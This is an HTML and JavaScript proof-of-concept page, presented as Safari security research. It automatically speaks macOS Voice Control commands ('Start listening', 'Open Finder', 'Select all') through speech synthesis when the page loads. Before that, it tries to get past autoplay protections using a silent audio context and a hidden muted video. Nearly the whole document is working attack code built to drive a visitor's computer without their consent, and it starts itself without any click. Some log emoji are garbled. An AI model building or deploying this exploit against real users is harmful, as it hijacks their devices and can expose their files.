<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced Voice Control Autoplay Test</title>
    <style>
        :root {
            --primary: #6366f1;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --dark: #1f2937;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            color: white;
            min-height: 100vh;
            padding: 20px;
            line-height: 1.6;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
        }

        .security-warning {
            background: rgba(239, 68, 68, 0.3);
            border: 2px solid #ef4444;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: center;
        }

        .test-interface {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            margin: 20px 0;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .sequence-display {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }

        .sequence-step {
            display: flex;
            align-items: center;
            gap: 15px;
            margin: 12px 0;
            padding: 12px;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }

        .sequence-step.active {
            background: rgba(99, 102, 241, 0.3);
            border-left: 4px solid var(--primary);
        }

        .sequence-step.completed {
            background: rgba(16, 185, 129, 0.2);
            border-left: 4px solid var(--success);
        }

        .step-number {
            background: var(--primary);
            color: white;
            width: 28px;
            height: 28px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 0.9em;
        }

        .step-command {
            flex: 1;
            font-size: 1.1em;
            font-weight: 500;
        }

        .step-timing {
            color: var(--warning);
            font-size: 0.9em;
        }

        .status-log {
            background: rgba(0, 0, 0, 0.6);
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 0.9em;
            height: 200px;
            overflow-y: auto;
            border: 1px solid #333;
        }

        .voice-indicator {
            display: flex;
            justify-content: center;
            gap: 4px;
            margin: 25px 0;
            height: 60px;
            align-items: center;
        }

        .voice-bar {
            width: 6px;
            height: 20px;
            background: var(--primary);
            border-radius: 3px;
            transition: all 0.3s ease;
        }

        .speaking .voice-bar {
            animation: voicePulse 0.6s ease-in-out infinite;
        }

        @keyframes voicePulse {
            0%, 100% { transform: scaleY(1); opacity: 0.7; }
            50% { transform: scaleY(2.5); opacity: 1; background: #8b5cf6; }
        }

        .success { color: #00ff88; }
        .error { color: #ff4444; }
        .warning { color: #ffaa00; }
        .info { color: #66ccff; }

        .controls {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin: 20px 0;
            flex-wrap: wrap;
        }

        .btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .btn:hover {
            background: #4f46e5;
            transform: translateY(-2px);
        }

        .btn:disabled {
            background: #6b7280;
            cursor: not-allowed;
            transform: none;
        }

        .instructions {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 10px;
            margin-top: 25px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Zero-Interaction Remote Command Execution Chain via Voice Control and Auto-Play Bypass</h1>
            <p>By sean mutuku</p>
        </header>

        <div class="security-warning">
            <h3> Security Research - Safari Autoplay Test</h3>
            <p>This voice commands will autoplay in Safari without user interaction</p>
        </div>

        <div class="test-interface">
            <h2> Auto-Execution Sequence</h2>
            <p>Voice commands should start automatically in Safari</p>

            <div class="voice-indicator" id="voiceIndicator">
                <div class="voice-bar" style="animation-delay: 0s"></div>
                <div class="voice-bar" style="animation-delay: 0.1s"></div>
                <div class="voice-bar" style="animation-delay: 0.2s"></div>
                <div class="voice-bar" style="animation-delay: 0.3s"></div>
                <div class="voice-bar" style="animation-delay: 0.4s"></div>
                <div class="voice-bar" style="animation-delay: 0.5s"></div>
            </div>

            <div class="sequence-display">
                <h3>Enhanced Command Sequence:</h3>
                <div class="sequence-step" id="step1">
                    <div class="step-number">1</div>
                    <div class="step-command">"Start listening"</div>
                    <div class="step-timing">Immediately</div>
                </div>
                <div class="sequence-step" id="step2">
                    <div class="step-number">2</div>
                    <div class="step-command">"Open Finder"</div>
                    <div class="step-timing">+2 seconds</div>
                </div>
                <div class="sequence-step" id="step3">
                    <div class="step-number">3</div>
                    <div class="step-command">"Click documents"</div>
                    <div class="step-timing">+2 seconds</div>
                </div>
                <div class="sequence-step" id="step4">
                    <div class="step-number">4</div>
                    <div class="step-command">"Move down"</div>
                    <div class="step-timing">+2 seconds</div>
                </div>
                <div class="sequence-step" id="step5">
                    <div class="step-number">5</div>
                    <div class="step-command">"Select all"</div>
                    <div class="step-timing">+2 seconds</div>
                </div>
            </div>

            <div class="controls">
                <button class="btn" onclick="startSequence()" id="startBtn">
                    ‚ñ∂ Start Sequence
                </button>
                <button class="btn" onclick="stopSequence()" id="stopBtn" disabled>
                    ‚èπ Stop Sequence
                </button>
                <button class="btn" onclick="resetSequence()">
                     Reset
                </button>
            </div>

            <div class="status-log" id="statusLog">
                Status: Initializing autoplay test...
            </div>
        </div>

        <div class="instructions">
            <h3> Test Criteria:</h3>
            <ul>
                <li><strong>Safari:</strong> Should autoplay without any clicks</li>
                <li><strong>Chrome:</strong> Will likely require user interaction</li>
                <li><strong>Voice:</strong> Enhanced clarity with Alex voice at 0.75 rate</li>
            </ul>
        </div>
    </div>

    <!-- Hidden video for autoplay bypass -->
    <video id="hiddenVideo" muted playsinline style="display: none;"></video>

    <script>
        let speechSynthesis = window.speechSynthesis;
        let isSequenceRunning = false;
        let currentStep = 0;
        let sequenceTimeout = null;
        let enhancedVoice = null;

        const commandSequence = [
            { command: "Start listening", delay: 2000, stepId: "step1" },
            { command: "Open Finder", delay: 2000, stepId: "step2" },
            { command: "Click documents", delay: 2000, stepId: "step3" },
            { command: "Move down", delay: 2000, stepId: "step4" },
            { command: "Select all", delay: 2000, stepId: "step5" }
        ];

        function log(message, type = 'info') {
            const logElement = document.getElementById('statusLog');
            const entry = document.createElement('div');
            entry.className = type;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logElement.appendChild(entry);
            logElement.scrollTop = logElement.scrollHeight;
        }

        function updateStepVisual(stepIndex, state) {
            commandSequence.forEach((_, index) => {
                const step = document.getElementById(`step${index + 1}`);
                if (step) {
                    step.classList.remove('active', 'completed');
                }
            });

            for (let i = 0; i <= stepIndex; i++) {
                const step = document.getElementById(`step${i + 1}`);
                if (step) {
                    if (i === stepIndex && state === 'active') {
                        step.classList.add('active');
                    } else if (i <= stepIndex) {
                        step.classList.add('completed');
                    }
                }
            }
        }

        // Autoplay bypass techniques for Safari
        function tryAutoplayBypass() {
            log('üîß Attempting autoplay bypass...', 'info');
            
            // Technique 1: Silent audio context
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                gainNode.gain.value = 0;
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                oscillator.start();
                setTimeout(() => oscillator.stop(), 100);
                log('‚úÖ Silent audio context created', 'success');
            } catch (e) {
                log(`‚ùå Audio context failed: ${e.message}`, 'error');
            }

            // Technique 2: Video autoplay
            try {
                const video = document.getElementById('hiddenVideo');
                video.src = 'data:video/webm;base64,GkXfo0AgQoaBAUL3gQFC8oEEQvOBCEKCQAR3ZWJtQoeBAkKFgQIYU4BnQI0VSalmQCgq17FAAw9CQE2AQAZ3aGFtbXlXQUAGd2hhbW15RIlACECPQAAAAAAAFlSua0AxrkAu14EBY8WBAZyBACK1nEADdW5khkAFVl9WUDglhohAA1ZQOIOBAeBABrCBCLqBCB9DtnVAIueBAKNAH0NWUDg4gQETg4EBI4OCBCLqBCB/';
                video.play().then(() => {
                    log('‚úÖ Video autoplay successful', 'success');
                }).catch(e => {
                    log(`‚ùå Video autoplay blocked: ${e.message}`, 'error');
                });
            } catch (e) {
                log(`‚ùå Video autoplay error: ${e.message}`, 'error');
            }
        }

        // Initialize enhanced voice
        function initializeEnhancedVoice() {
            const voices = speechSynthesis.getVoices();
            
            // Find the clearest voice for commands
            const voicePriority = [
                'Alex',           // macOS default - very clear for commands
                'Victoria',       // Good command voice
                'Samantha',       // iOS default
                'Karen',         // Australian - clear
                'Daniel'         // UK English - clear
            ];

            for (const voiceName of voicePriority) {
                const voice = voices.find(v => v.name.includes(voiceName));
                if (voice) {
                    enhancedVoice = voice;
                    log(`‚úÖ Enhanced voice: ${voice.name}`, 'success');
                    return;
                }
            }

            // Fallback
            enhancedVoice = voices.find(voice => voice.lang === 'en-US') || voices[0];
            if (enhancedVoice) {
                log(`‚ÑπÔ∏è Fallback voice: ${enhancedVoice.name}`, 'info');
            }
        }

        function speakCommand(command, stepIndex) {
            return new Promise((resolve) => {
                if (!speechSynthesis) {
                    log('‚ùå Speech synthesis not supported', 'error');
                    resolve();
                    return;
                }

                if (speechSynthesis.speaking) {
                    speechSynthesis.cancel();
                }

                log(`üé§ Speaking: "${command}"`, 'info');
                updateStepVisual(stepIndex, 'active');

                const indicator = document.getElementById('voiceIndicator');
                indicator.classList.add('speaking');

                const utterance = new SpeechSynthesisUtterance(command);
                
                // üéØ ENHANCED VOICE SETTINGS
                utterance.rate = 0.75;        // Slower for better recognition
                utterance.pitch = 0.9;        // Slightly lower, more robotic
                utterance.volume = 1.0;       // Maximum volume
                utterance.lang = 'en-US';     // Explicit language
                
                if (enhancedVoice) {
                    utterance.voice = enhancedVoice;
                }

                utterance.onstart = function() {
                    log(`üîä Speaking: "${command}"`, 'success');
                };

                utterance.onend = function() {
                    indicator.classList.remove('speaking');
                    log(`‚úÖ Command completed: "${command}"`, 'success');
                    updateStepVisual(stepIndex, 'completed');
                    resolve();
                };

                utterance.onerror = function(event) {
                    indicator.classList.remove('speaking');
                    log(`‚ùå Speech error: ${event.error}`, 'error');
                    updateStepVisual(stepIndex, 'completed');
                    resolve();
                };

                setTimeout(() => {
                    try {
                        speechSynthesis.speak(utterance);
                    } catch (e) {
                        log(`‚ùå Speech blocked: ${e.message}`, 'error');
                        resolve();
                    }
                }, 50);
            });
        }

        async function executeSequenceStep(stepIndex) {
            if (stepIndex >= commandSequence.length || !isSequenceRunning) {
                if (isSequenceRunning) {
                    log('üéâ Sequence completed!', 'success');
                    isSequenceRunning = false;
                    document.getElementById('stopBtn').disabled = true;
                    document.getElementById('startBtn').disabled = false;
                }
                return;
            }

            const step = commandSequence[stepIndex];
            currentStep = stepIndex;

            await speakCommand(step.command, stepIndex);

            if (isSequenceRunning) {
                sequenceTimeout = setTimeout(() => {
                    executeSequenceStep(stepIndex + 1);
                }, step.delay);
            }
        }

        function startSequence() {
            if (isSequenceRunning) return;

            if (!speechSynthesis) {
                log('‚ùå Speech synthesis not available', 'error');
                return;
            }

            isSequenceRunning = true;
            currentStep = 0;
            document.getElementById('stopBtn').disabled = false;
            document.getElementById('startBtn').disabled = true;

            log('üöÄ Starting enhanced voice sequence...', 'info');
            
            commandSequence.forEach((_, index) => {
                const step = document.getElementById(`step${index + 1}`);
                if (step) step.classList.remove('active', 'completed');
            });

            executeSequenceStep(0);
        }

        function stopSequence() {
            if (isSequenceRunning) {
                isSequenceRunning = false;
                if (sequenceTimeout) clearTimeout(sequenceTimeout);
                if (speechSynthesis.speaking) speechSynthesis.cancel();
                document.getElementById('voiceIndicator').classList.remove('speaking');
                log('‚èπÔ∏è Sequence stopped', 'warning');
                document.getElementById('stopBtn').disabled = true;
                document.getElementById('startBtn').disabled = false;
                
                if (currentStep >= 0) {
                    updateStepVisual(currentStep, 'completed');
                }
            }
        }

        function resetSequence() {
            stopSequence();
            currentStep = 0;
            commandSequence.forEach((_, index) => {
                const step = document.getElementById(`step${index + 1}`);
                if (step) step.classList.remove('active', 'completed');
            });
            log('üîÑ Sequence reset', 'info');
            document.getElementById('startBtn').disabled = false;
        }

        // Initialize and auto-start
        document.addEventListener('DOMContentLoaded', function() {
            log('üîß Initializing enhanced voice autoplay test...', 'info');

            // Try autoplay bypass immediately
            tryAutoplayBypass();

            // Initialize voice system
            if (speechSynthesis.getVoices().length > 0) {
                initializeEnhancedVoice();
            } else {
                speechSynthesis.onvoiceschanged = function() {
                    initializeEnhancedVoice();
                };
            }

            // AUTO-START THE SEQUENCE (This is the key change)
            setTimeout(() => {
                log('üöÄ AUTO-STARTING: Beginning voice commands without user interaction...', 'info');
                startSequence();
            }, 1000);
        });

        // Auto-stop if page hidden
        document.addEventListener('visibilitychange', function() {
            if (document.hidden && isSequenceRunning) {
                stopSequence();
                log('‚è∏Ô∏è Sequence paused', 'warning');
            }
        });
    </script>
</body>
</html>
